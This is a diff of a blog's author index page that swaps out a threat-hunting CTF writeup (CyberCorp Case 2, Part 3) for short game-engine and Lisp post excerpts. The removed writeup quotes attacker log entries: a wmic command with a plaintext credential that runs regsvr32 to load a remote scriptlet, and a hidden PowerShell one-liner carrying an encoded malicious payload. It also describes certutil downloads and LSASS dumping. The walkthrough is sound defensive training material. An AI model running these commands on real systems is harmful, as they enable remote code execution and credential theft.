-            <a href="../tag/assembly.html" class="tag">assembly</a>
-            <a href="../tag/reverse-engineering.html" class="tag">reverse-engineering</a>
+            <a href="../tag/dev.html" class="tag">dev</a>
+            <a href="../tag/game_engine.html" class="tag">game_engine</a>
         </div>
     </article>
     <article class="post-item">
         <header class="article-header">
+            <a href="../category/game_engine.html" class="article-category-label">game_engine</a>
             <h2 class="post-title">
-                <a href="../cyber-corp-case-2-writeup-part-3.html">Cyber Corp Case 2 Writeup - Part 3</a>
+                <a href="../following-lispy-conventions.html">#4 - Following Lispy conventions</a>
             </h2>
             <div class="article-meta">
-                <time datetime="2021-11-06T11:10:00+08:00">Sat 06 November 2021</time>
-                <span>•</span>
-                <a href="../category/threat-hunting.html">threat-hunting</a>
+                <time datetime="2020-05-15T07:00:00+08:00">Fri 15 May 2020</time>
             </div>
         </header>
 
         <div class="article-content">
-            <p>The <a href="https://cyberdefenders.org/labs/75">second case of the CyberCorp challenge</a> on <a href="https://cyberdefenders.org/">CyberDefenders.org</a> is all about threat hunting. Created by <a href="https://twitter.com/BlackMatter23">@BlackMatter23</a> and his team, this challenge is based on a real-world attack so it is perfect for gaining practical experience in threat hunting.</p>
-<p>This write-up is the third and final part of this walkthrough. You could read <a href="threat-hunting-from-home-cyber-corp-wmi-persistence">Part 1 here</a> and <a href="cyber-corp-case-2-writeup-part-2">Part 2 here</a>.</p>
-<h2 id="finding-the-post-reverse-shell-activity">Finding the post-reverse shell activity</h2>
-<blockquote>
-<p>Question 11. As a result of running a malicious code, which we talk about in questions 9 and 10, the attacker got a shell on the compromised host. Using this access, the attacker downloaded the Active Directory collection utility to the host in an encoded form. Specify a comma-separated, non-spaced link where the encoded version of the utility was downloaded and a SHA256 hash of the decoded version that was directly run by the attacker on the compromised host.</p>
-</blockquote>
-<p>So from the question, I knew that the download happened after the reverse-shell was run. And so I changed the start date timestamp to <code>Jun 22, 2021 @ 07:41:56.000</code>. I also knew that because there was a downloaded file, there would definitely be "NetworkConnection" and "FileCreate" events that would happen afterward. And so, the query I've created is this:</p>
-<blockquote>
-<p>event_type:FileCreate OR event_type:NetworkConnection</p>
-</blockquote>
-<p><img alt="cyber-corp-case-2-writeup-part-3-01" src="../images/cyber-corp-case-2-writeup-part-3-01.png" /></p>
-<p>The result shows <code>cmd.exe</code> creating a <code>certutil.exe</code> process. And the reason why this is suspicious is that <code>certutil.exe</code> can be used as an alternative way of downloading files from an external source. You can read more about this <a href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/">here</a>.</p>
-<p>The next event shows <code>certutil.exe</code> establishing a connection to an external IP and downloading the file <code>chrome_installer.log2:data</code>. This tells us the first half of the answer to the question.</p>
-<p>The next step is to find out the SHA256 of the decoded version of the downloaded file. I then updated the timestamp to <code>Jun 22, 2021 @ 07:46:10.000</code>, which is the time the file was downloaded, and then used the query:</p>
-<blockquote>
-<p>event_type:ProcessCreate AND enrich.ioa.max_severity:*</p>
-</blockquote>
-<p><img alt="cyber-corp-case-2-writeup-part-3-02" src="../images/cyber-corp-case-2-writeup-part-3-02.png" /></p>
-<p>We could see that <code>cmd.exe</code> created the process <code>svchost.exe</code>, but the suspicious thing is that the process' directory is <code>c:\windows\temp\</code> which is highly unusual for <code>svchost.exe</code> to run from. We can easily assume that the previously downloaded <code>chrome_installer.log2</code> was renamed to <code>svchost.exe</code> and this is the one that it ran. Getting the hash for this file will give us the second half of our answer to this question.</p>
-<h2 id="finding-the-dump-file">Finding the dump file</h2>
-<blockquote>
-<p>Question 12. During the post-exploitation process, the attacker used one of the standard Windows utilities to create a memory dump of a sensitive system process that contains credentials of active users in the system. Specify the name of the executable file of the utility used and the name of the memory dump file created, separated by a comma without spaces.</p>
-</blockquote>
-<p>Without changing the date range and the query from the previous question, I continued to investigate the other events that have a value of <code>high</code> in its <code>enrich.ioa.max_severity</code> field. The event below happened a few seconds after the event from the previous question.</p>
-<p><img alt="cyber-corp-case-2-writeup-part-3-03" src="../images/cyber-corp-case-2-writeup-part-3-03.png" /></p>
-<p>From the <code>enrich.ioa.rules</code> field we can see the value <code>win_memory_dumping_via_comsvcs_minidump</code>. What happened was that <code>rundll32.exe</code> executed the <code>comsvs.dll</code> and dumped the LSASS memory into a dump file. You can learn more about this technique <a href="https://attack.mitre.org/techniques/T1003/001/">here</a>. Here is that technique visualized with <a href="https://github.com/accidentalrebel/vATTACK">my vATT&amp;CK tool</a>:</p>
-<p><img alt="cyber-corp-case-2-writeup-part-3-04" src="../images/cyber-corp-case-2-writeup-part-3-04.png" /></p>
-<p>From the information above, we now have what we need to answer the question.</p>
-<h2 id="detecting-lateral-movement">Detecting lateral movement</h2>
-<blockquote>
-<p>Question 13. Presumably, the attacker extracted the password of one of the privileged accounts from the memory dump we discussed in the previous question and used it to run a malicious code on one of the domain controllers. What account are we talking about? Specify its username and password as the answer in login:password format.</p>
-</blockquote>
-<p>The first thing I wanted to find out was to figure out what the IP of the domain controller is. I knew that there is a Windows event ID <code>5308 (Microsoft-Windows-Group-Policy)</code> that lists the domain controller details. So I made a query based on that and also added in search for the texts "domain" and "controller".</p>
-<blockquote>
-<p>event_id:5308 AND ("domain" OR "controller")</p>
-</blockquote>
-<p>And this gave me exactly what I was looking for:</p>
-<div class="codehilite"><pre><span></span><code>Domain Controller details: 
-    Domain Controller Name : DC01-CYBERCORP.cybercorp.com
-    Domain Controller IP Address : 192.168.184.100
-</code></pre></div>
-
-<p>Now that I know the IP, I can now search for any events related to this IP:</p>
-<blockquote>
-<p>net_dst_ipv4:192.168.184.100 AND enrich.ioa.max_severity:*</p>
-</blockquote>
-<p><img alt="cyber-corp-case-2-writeup-part-3-05" src="../images/cyber-corp-case-2-writeup-part-3-05.png" /></p>
-<p>As we can see, we have a <code>wmic</code> command that passes the username and password to the domain controller's IP. This answers question 13.</p>
-<h2 id="side-quest-tracing-the-next-steps">Side Quest: Tracing the next steps</h2>
-<p>I wanted to find out what exactly happens when the command line from the previous question is run:</p>
-<blockquote>
-<p>wmic  /node:192.168.184.100 /user:inventory /password:jschindler35 process call create 'regsvr32 /u /n /s /i:http://94.177.253.126:8080/Ec9KoccK.sct scrobj.dll'</p>
-</blockquote>
-<p>From <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md#atomic-test-6---wmi-execute-remote-process">my research</a>, I learned that this is using WMI to execute a process on a remote host. In this case, <code>regsvr32</code> is called to execute the specified remote <code>.sct</code> file with <code>scrobj.dll</code>. More info about this technique <a href="https://attack.mitre.org/techniques/T1218/010/">here</a> and <a href="https://github.com/redcanaryco/atomic-red-team/blob/36d49de4c8b00bf36054294b4a1fcbab3917d7c5/atomics/T1218.010/T1218.010.md#atomic-test-2---regsvr32-remote-com-scriptlet-execution">here</a>. </p>
-<p><img alt="cyber-corp-case-2-writeup-part-3-06" src="../images/cyber-corp-case-2-writeup-part-3-06.png" /></p>
-<h2 id="the-second-group">The second group</h2>
-<blockquote>
-<p>Question 14. A compromised user account is a member of two Built-in privileged groups on the Domain Controller. The first group is the Administrators. Find the second group. Provide the SID of this group as an answer.</p>
-</blockquote>
-<p>To solve this, we'll be needing to make a search query with the following information that we got from the previous questions:</p>
-<ul>
-<li><code>inventory</code> - The name of the compromised user account</li>
-<li><code>DC01-CYBERCORP.cybercorp.com</code> - The hostname of the domain controller</li>
-<li><code>192.168.184.100</code> - IP of the domain controller</li>
-</ul>
-<blockquote>
-<p>("inventory<em>" OR "group</em>") AND "DC01-CYBERCORP.cybercorp.com" AND dev_ipv4:192.168.184.100 AND usr_tgt_name:Inventory</p>
-</blockquote>
-<p>There will be a lot of entries, but the one below would have information that we need:</p>
-<p><img alt="cyber-corp-case-2-writeup-part-3-07" src="../images/cyber-corp-case-2-writeup-part-3-07.png" /></p>
-<p>The event lists the group membership information for the user <code>inventory</code>. Within the field <code>usr_token_groups</code> we can see the following information:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="c">%{S-1-5-21-3899523589-2416674273-2941457644-513}</span>
-<span class="w">    </span><span class="c">%{S-1-1-0}</span>
-<span class="w">    </span><span class="c">%{S-1-5-32-544}</span>
-<span class="w">    </span><span class="c">%{S-1-5-32-551}</span>
-<span class="w">    </span><span class="c">%{S-1-5-32-545}</span>
-<span class="w">    </span><span class="c">%{S-1-5-32-554}</span>
-<span class="w">    </span><span class="c">%{S-1-5-2}</span>
-<span class="w">    </span><span class="c">%{S-1-5-11}</span>
-<span class="w">    </span><span class="c">%{S-1-5-15}</span>
-<span class="w">    </span><span class="c">%{S-1-18-1}</span>
-<span class="w">    </span><span class="c">%{S-1-5-21-3899523589-2416674273-2941457644-1105}</span>
-<span class="w">    </span><span class="c">%{S-1-16-12288}</span>
-</code></pre></div>
-
-<p>Based on <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/a-tokengroups">this</a> and <a href="https://morgantechspace.com/2015/08/active-directory-tokengroups-vs-memberof.html">this</a>, User Token Groups contains the list of security identifiers for groups and that it holds both direct group membership and recursive list of nested groups. This means that the answer to our question is included in that list.</p>
-<p>I decided to search for any mention of the SID format <code>S-1-...</code>. So I changed the query to this:</p>
-<blockquote>
-<p>"S-1-*" AND groups AND "DC01-CYBERCORP.cybercorp.com" AND dev_ipv4:192.168.184.100</p>
-</blockquote>
-<p>This revealed a new type of <code>event_type</code> value which is <code>InventoryInfo</code>, as shown below:</p>
-<p><img alt="cyber-corp-case-2-writeup-part-3-08" src="../images/cyber-corp-case-2-writeup-part-3-08.png" /></p>
-<p>This inventory info seems to be from an inventory collection tool, but I could not get more info more than that. What is important to us though is the <code>dev_inventory</code> field which contains:</p>
-<div class="codehilite"><pre><span></span><code>...
-{
-    &quot;sid&quot;: &quot;S-1-5-32-544&quot;,
-    &quot;name&quot;: &quot;BUILTIN\\Administrators&quot;,
-    &quot;members&quot;: [
-        &quot;CYBERCORP\\Administrator&quot;,
-        &quot;CYBERCORP\\Enterprise Admins&quot;,
-        &quot;CYBERCORP\\Domain Admins&quot;,
-        &quot;CYBERCORP\\inventory&quot;
-    ]
-},
-...
-{
-    &quot;sid&quot;: &quot;S-1-5-32-551&quot;,
-    &quot;name&quot;: &quot;BUILTIN\\Backup Operators&quot;,
-    &quot;members&quot;: [
-        &quot;CYBERCORP\\backupsrv&quot;,
-        &quot;CYBERCORP\\inventory&quot;
-    ]
-},
-...
-</code></pre></div>
-
-<p>The information above shows us two groups that contain <code>inventory</code> as one of their members. The question mentions something about <code>Administrators</code> being the first group, then that means the other group is none other than <code>Backup Operators</code>. Getting the sid of this is our answer to this question.</p>
-<h2 id="the-second-reverse-shell">The Second Reverse Shell</h2>
-<blockquote>
-<p>Question 15. As a result of malicious code execution on the domain controller using a compromised account, the attacker got a reverse shell on that host. This shell used a previously not seen IP address as the command center. Specify its address as the answer.</p>
-</blockquote>
-<p>My initial approach was I set the start date to  <code>Jun 22, 2021 @ 08:21:22.000</code> which is the timestamp when the attacker was able to run a remote code on the domain controller (See question #13). I also searched for <code>event_type</code> with a value of <code>NetworkConnection</code> and made sure that the events only happened in the domain controller's IP.</p>
-<blockquote>
-<p>event_type:NetworkConnection AND dev_ipv4:192.168.184.100</p>
-</blockquote>
-<p>This, however, showed too many events. There are just too many network events and too little information in the question to sift through them all.</p>
-<p>I knew from the hint that the format of the IP is XXX.XXX.XX.XX. This already helps a lot in narrowing our options, but I still wanted to find it without relying on the hint.</p>
-<p>So I used a different approach. My thought process was to start from when the initial code was ran on the domain controller and go see what happened next. This code ran <code>regsvr32</code> which executed an external script (See Question #13). We could use in our query, and so we get:</p>
-<blockquote>
-<p>dev_ipv4:192.168.184.100 OR "regsvr32"</p>
-</blockquote>
-<p>The results of this query was more revealing:</p>
-<p><img alt="cyber-corp-case-2-writeup-part-3-09" src="../images/cyber-corp-case-2-writeup-part-3-09.png" /></p>
-<p>The very first entry is our <code>wmic</code> event that used <code>regsvr32</code>. This is followed by a PowerShell script accessing <code>lsass.exe</code> and also injecting code into <code>svchost.exe</code>.</p>
-<p>I then continued down the list of events to check for any outbound network connections with an IP that has not been previously seen. Unfortunately, the events are still too many to go through. Looking at the Top 5 values also wasn't of too much help.</p>
-<p>Going back to the list of events we can see that immediately following the <code>wmic</code> event, there is a <code>powershell</code> process that accesses <code>lsass.exe</code>. It also has a very interesting entry under the <code>proc_cmdline</code> field:</p>
-<div class="codehilite"><pre><span></span><code><span class="s2">&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="n">-nop</span> <span class="n">-w</span> <span class="n">hidden</span> <span class="n">-noni</span> <span class="n">-c</span> <span class="s2">&quot;&amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&#39;H4sIADES+14CA7VWa2+bSBT9nEj5D6iyBCiOjV03yUaqtIAhxrVTU2z8qlVhGMPEw6MwxCbd/ve9Y0OaqmnVrrQIiXnc57ln5rLJI5fiOOLc8Sfuy9npychJnZATau51nauF7iUST05guZYlLp1zbzlhKSdJNw4dHK1ubtQ8TVFEj/PGLaJylqFwTTDKBJH7h5sGKEUX79f3yKXcF672qXFL4rVDSrFCddwAcRdy5LG9Qew6LJiGlRBMBf7jR15cXrRWDe1z7pBM4K0ioyhseITwIvdVZA7HRYIEfojdNM7iDW1McfS63ZhEmbNBd2DtAQ0RDWIv40VIA94U0TyNuGNCzMJxX+BhOEpjV/a8FGUZX+eWzPZytfpbWJaOP+QRxSFqGBFFaZxYKH3ALsoaPSfyCPqANivQsmiKI38liiD2EG+RUItyQurcn5gR7tCugu13lYTnSiA1oqlYh0q+lOgw9nKCjqr8C5FC+UV4KgoAdF/PTs9ONxVbvOI5WWB0sjyMEcQmjOIMH6TeclKdG4ITh8ZpAdPaOM2RuHpClqt9dus/125VoiDoZrCwtGPsrUChrGVto07MkG38nJRdtMER6haRE2K34p3wEsBoQ9AhvUYldgcxCXy5gbwuIsh3KEOM1fkHNS3E9ElXyTHxUCq7UKQMooL6id8HcyyCwBvREIUA0HEOxKttgO2oki4ZXlTe2RyEeJU4WVbnRjkcN7fOWcghyKtzcpThckvOaXwY8t/CHeaEYtfJaGVuJT4BWTpU4yijae5C0SD5sZUgFzuEYVHnethDSmFhv3LMv4iE6hAChwAsPUAlYIUhYFFGhRRihLKLDQtRI0wICkHicOx14vhwyEuiH5jj+MjjfwiwIvKRtQyLCoRn4UGBLRLTOmfjlML1wXB1s//i+9mlcYxCTVFZB6E6GUuloIzRtfU9o2OJyCH/lELuehqHipOhy87xehBeNTXcfTPqxo8yPJr+wbQVa2IvjKHXJ5ZBrbmGB5MgMHDL8GFeTDR/RKXk3Xjc61vdnpx298FGNjJD6ymF2VJkt4ev7L4ymYAeVgfm/d6QPSX0Z/5c3RmjYGaAI3XgGz58FSNwFWkh+YqkqwNLCTQsyb5l9sxOa2E0r4mCHy3DknvTJ39PfrROpzfbj+W7YV8O9Pee3mrrB/0t019sbwdd7TB32dycZxrWwI+mz007QFM7UaaavjDtxPDPd75pD5odPVBg3cD7QWI14Wm1+g+R9zgk149DCNe0F32MFoaPCl82ZdmaR8Ra71RZ7V49JHPJ2OoTWNuOjWhvrpOhV8x7zb/sIUZJLJuaLOsEjmMoO7tuszWN35n2G3OiSftiIu132n1zp+H+blt+J7eXl35z0xk1bcuIek6gQLxFv7PF/XPYCx1bmm+aNsOvq0XNx2hGnJHaism62Zrg7pWiGBj174Yu+axAzmDjjbmO1bYbbCAmw782/VkctZ0t2J36MkQH+UGdN30DdJSc4O3kfMZs9XdS2N9LLM6wfw2xtcsYZBoZsybEJ/e6lhrdWsas7SFdaZ67b18xygJna1vvGRN/1j2GTpoFDgGGQleorgQ9TvXyph/FmGkIAvs/2KI0QgTaKzTg6ljJhMQu6zPQEqDDHfsOa4MTGL5uvzgSuSdB8VvzqZZubhYQIhzU9X1jgCKfBnVp/1qSoJdI+44E6f1+UmqcFAIYqrNOBIgcrZKDVZGd21p6dfW/wlTeFQF8vF/D9G3tF7u/BZ1UZ6n+sPj9wh/h+KdZTx1MQdCCm46gY5t9KfmSDs9+QKAcUO1N+bBfyPc5vbiD35Kz038BKGgg/awKAAA=&#39;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&quot;</span>
-</code></pre></div>
-
-<p>Decoding the base64 string would reveal a PowerShell script that has a hash that <a href="https://www.virustotal.com/gui/file/f4a3fa10be15ad4414ce897a5d7fcd43d7a6f7b28855adbec76c545d72c87662/detection">VirusTotal flags as malicious</a>. </p>
-<p><img alt="cyber-corp-case-2-writeup-part-3-11" src="../images/cyber-corp-case-2-writeup-part-3-11.png" /></p>
-<p>This is a good indication that this PowerShell process is up to no good. Now we need to find out what other things this process did. The process has a PID of 4460, so plugging that into a query we get:</p>
-<blockquote>
-<p>(proc_id:4460 OR proc_p_id:4460 OR proc_c_id:4460 OR proc_tgt_id:4460) AND dev_ipv4:192.168.184.100</p>
-</blockquote>
-<p>And these are the results:</p>
-<p><img alt="cyber-corp-case-2-writeup-part-3-12" src="../images/cyber-corp-case-2-writeup-part-3-12.png" /></p>
-<p>Looking at the external IP that the process is connecting to, we could see that this is something new that we have not seen before. Thankfully, I had been making a list of all internal and external IPs that I came across during the challenge (Just shows the importance of writing down every information you come across!). Plugging this IP is our solution to this problem.</p>
-<hr />
-<p>There we have it. We've gone through and answered all 15 questions. Congratulations if you've made it this far!</p>
-<p>If you missed it, you could read <a href="threat-hunting-from-home-cyber-corp-wmi-persistence">Part 1 here</a> and <a href="cyber-corp-case-2-writeup-part-2">Part 2 here</a>.</p>
-<p>I hope that I was able to help you in understanding the process of solving this challenge. I had a lot of fun going through and writing about it. Again, thank you to <a href="https://twitter.com/BlackMatter23">@BlackMatter23</a> and the team for sharing this challenge and to <a href="https://cyberdefenders.org/">CyberDefenders</a> for hosting it.</p>
+            <p><img alt="following-lispy-conventions-01" src="../images/following-lispy-conventions-01.png" /></p>
+<p>I was adding new Lisp functions to <a href="https://github.com/accidentalrebel/Rebel-Game-Engine">my game engine</a> when I noticed that I had functions that had a naming scheme that were inconsistent with others. For example, I had ones that create objects like <em>sprite_create</em> and <em>shader_create</em> but this one function I named <em>make_vec3</em>. I proceeded to rename <em>make_vec3</em> to <em>vec3_create</em>. Not only is it consistent with other names but it made me realize that having a pattern of object_verb makes it easy to parse the function and what it does. </p>
+<p>This made me wonder if there are other ways I could improve which led me to this page <a href="http://community.schemewiki.org/?variable-naming-convention">about variable naming conventions</a> for Scheme. I learned that the language employs a rather effective yet simple naming convention for functions and variables. I've noticed them before but never really thought about their usefulness. </p>
+<p>For example, adding a <em>?</em> prefix easily indicates that the function, when called, will always return …</p>
+            <a href="../following-lispy-conventions.html" class="read-more">Read more &rarr;</a>
         </div>
 
         <div class="tags">
-            <a href="../tag/threat-hunting.html" class="tag">threat-hunting</a>
-            <a href="../tag/cyberdefenders.html" class="tag">cyberdefenders</a>
+            <a href="../tag/dev.html" class="tag">dev</a>
+            <a href="../tag/game_engine.html" class="tag">game_engine</a>
+        </div>
+    </article>
+    <article class="post-item">
+        <header class="article-header">
+            <a href="../category/dev.html" class="article-category-label">dev</a>
+            <h2 class="post-title">
+                <a href="../rebel-game-engine-now-works-on-different-platforms.html">#3 - Rebel Game Engine now works on different platforms</a>
+            </h2>
+            <div class="article-meta">
+                <time datetime="2020-05-10T07:08:00+08:00">Sun 10 May 2020</time>
+            </div>
+        </header>
+
+        <div class="article-content">
+            <p>After <a href="implemented-basic-scheme-scripting-for-rebel-game-engine.md">finishing the integration</a> of Chicken-scheme scripting for <a href="https://github.com/accidentalrebel/Rebel-Game-Engine">my custom game engine</a> I decided I wanted to tackle another hard problem, and that is making it cross-platform. At the very least, my engine should be able to deploy to Linux, Windows, and MacOSX.</p>
+<p><img alt="rebel-game-engine-now-works-on-different-platforms-01" src="../images/rebel-game-engine-now-works-on-different-platforms-01.jpg" /></p>
+<p>It might seem silly to be working on this while the engine is still in its early stages, but I think it is better to get this out of the way before the codebase becomes huge. With a small codebase I was able to easily identify the causes of the problems as I was porting them.</p>
+<p>It still wasn't a walk in the park, however. Being inexperienced with developing C programs on other platforms (I've only done it mostly in Linux) I had to do research and do a lot of trial and error. I learned so much about cross-compilers, portable makefiles, and the quirks of different …</p>
+            <a href="../rebel-game-engine-now-works-on-different-platforms.html" class="read-more">Read more &rarr;</a>
+        </div>
+
+        <div class="tags">
+            <a href="../tag/dev.html" class="tag">dev</a>
+            <a href="../tag/game_engine.html" class="tag">game_engine</a>
+        </div>
+    </article>
+    <article class="post-item">
+        <header class="article-header">
+            <a href="../category/lisp.html" class="article-category-label">lisp</a>
+            <h2 class="post-title">
+                <a href="../implemented-basic-scheme-scripting-for-rebel-game-engine.html">#2 - Implemented basic Scheme scripting for Rebel Game Engine</a>
+            </h2>
+            <div class="article-meta">
+                <time datetime="2020-05-07T21:35:00+08:00">Thu 07 May 2020</time>
+            </div>
+        </header>
+
+        <div class="article-content">
+            <p>When I first learned about <a href="http://synthcode.com/wiki/chibi-scheme">Chibi</a>, an embeddable scheme that allows scripting on C programs, I immediately tried it out on my game engine. I was able to make it work with my existing APIs but I kept on running against segfaults and memory issues. The community was helpful in answering my questions as I tried to track down the cause of the bug, but I eventually gave up out of frustration.</p>
+<p>I then learned about <a href="http://wiki.call-cc.org/eggref/5/bind">Chicken Scheme</a>, a somewhat competitor to Chibi that does the same thing but with a larger community and more documentation. I checked it out and liked it so I went ahead and implemented it.</p>
+<p><img alt="implemented-basic-scheme-scripting-for-rebel-game-engine-01" src="../images/implemented-basic-scheme-scripting-for-rebel-game-engine-01.png" /></p>
+<p>Thankfully I have not experienced any segfaults anymore. It's not because Chicken is better (I don't know well enough of the two to make a good comparison) but because I've come to better understand how to properly structure my code …</p>
+            <a href="../implemented-basic-scheme-scripting-for-rebel-game-engine.html" class="read-more">Read more &rarr;</a>
+        </div>
+
+        <div class="tags">
+            <a href="../tag/lisp.html" class="tag">lisp</a>
+            <a href="../tag/game_engine.html" class="tag">game_engine</a>
+            <a href="../tag/dev.html" class="tag">dev</a>
+        </div>
+    </article>
+    <article class="post-item">
+        <header class="article-header">
+            <a href="../category/engine.html" class="article-category-label">engine</a>
+            <h2 class="post-title">
+                <a href="../thinking-of-adding-lisp-to-my-custom-game-engine.html">#1 - Thinking of adding Lisp to my custom game engine</a>
+            </h2>
+            <div class="article-meta">
+                <time datetime="2020-05-03T11:19:00+08:00">Sun 03 May 2020</time>
+            </div>
+        </header>
+
+        <div class="article-content">
+            <p>I've long wondered if I should add a scripting language to <a href="https://github.com/accidentalrebel/Rebel-Game-Engine">my game engine</a>. I know that most game engines could do without such a feature but I just recently came across <a href="https://github.com/ashinn/chibi-scheme">Chibi-Scheme</a>, a library that allows the use of Scheme lisp scripting for C programs. </p>
+<p>I like Lisp. I use it a lot when customizing my Emacs environment (<a href="https://github.com/accidentalrebel?tab=repositories&amp;q=&amp;type=&amp;language=emacs+lisp">using ELisp</a>). There's something about it's syntax and different way to structure programs that appeals to my programmer brain. I've toyed with other Lisp flavors but never had a strong enough reason to continue using them. With Chibi-scheme I may have found that reason.</p>
+<p><img alt="thinking-of-adding-lisp-to-my-custom-game-engine-01" src="../images/thinking-of-adding-lisp-to-my-custom-game-engine-01.jpg" /></p>
+<p>I am aware that Lisp is not as widespread as Lua or Javascript. And that choosing it might limit the number of potential people to try out my game engine. But as I've been telling myself over and over, this is a self-learning project. So it's okay …</p>
+            <a href="../thinking-of-adding-lisp-to-my-custom-game-engine.html" class="read-more">Read more &rarr;</a>
+        </div>
+
+        <div class="tags">
+            <a href="../tag/dev.html" class="tag">dev</a>
+            <a href="../tag/lisp.html" class="tag">lisp</a>
+            <a href="../tag/engine.html" class="tag">engine</a>
         </div>
     </article>
 
@@ -946,26 +340,40 @@ The "powershell" string has 11 characters so we use 16.</p>
         <a href="../author/accidentalrebel3.html">3</a>
         <span class="current">4</span>
         <a href="../author/accidentalrebel5.html">5</a>
-        <a href="../author/accidentalrebel6.html">6</a>
-        <a href="../author/accidentalrebel7.html">7</a>
-        <a href="../author/accidentalrebel8.html">8</a>
-        <a href="../author/accidentalrebel9.html">9</a>
-        <a href="../author/accidentalrebel10.html">10</a>
-        <a href="../author/accidentalrebel11.html">11</a>
-        <a href="../author/accidentalrebel12.html">12</a>
-        <a href="../author/accidentalrebel13.html">13</a>
-        <a href="../author/accidentalrebel14.html">14</a>
-        <a href="../author/accidentalrebel15.html">15</a>
-        <a href="../author/accidentalrebel16.html">16</a>
 
     <a href="../author/accidentalrebel5.html">Next &raquo;</a>
 </nav>
+                </div>
+                <aside class="sidebar">
+                    <div class="sidebar-sticky">
+                        <img src="../theme/images/avatar.png" alt="AccidentalRebel" class="sidebar-avatar">
+                        <h3 class="sidebar-name">AccidentalRebel</h3>
+                        <p class="sidebar-realname">Juan Karlo Licudine</p>
+                        <p class="sidebar-bio">SOC leader and content engineer at TryHackMe. Writing about AI, security tools, malware analysis, and reverse engineering.</p>
+                        <ul class="sidebar-social">
+                            <li><a href="https://www.linkedin.com/in/juan-karlo-licudine/" target="_blank" rel="noopener">LinkedIn</a></li>
+                            <li><a href="https://github.com/accidentalrebel" target="_blank" rel="noopener">GitHub</a></li>
+                        </ul>
+                    </div>
+                </aside>
+            </div>
         </div>
     </main>
 
+    <footer class="site-footer">
+        <div class="container-wide">
+            <div class="footer-content">
+                <span>&copy; AccidentalRebel. SOC leader and content engineer at TryHackMe. Writing about AI, security tools, malware analysis, and reverse engineering.</span>
+                <ul class="footer-links">
+                    <li><a href="https://www.linkedin.com/in/juan-karlo-licudine/" target="_blank" rel="noopener">LinkedIn</a></li>
+                    <li><a href="https://github.com/accidentalrebel" target="_blank" rel="noopener">GitHub</a></li>
+                </ul>
+            </div>
+        </div>
+    </footer>
+
     <script src="../theme/js/main.js"></script>
-    
-    <!-- Google Analytics -->
+
     <script async src="https://www.googletagmanager.com/gtag/js?id=UA-55068085-2"></script>
     <script>
         window.dataLayer = window.dataLayer || [];
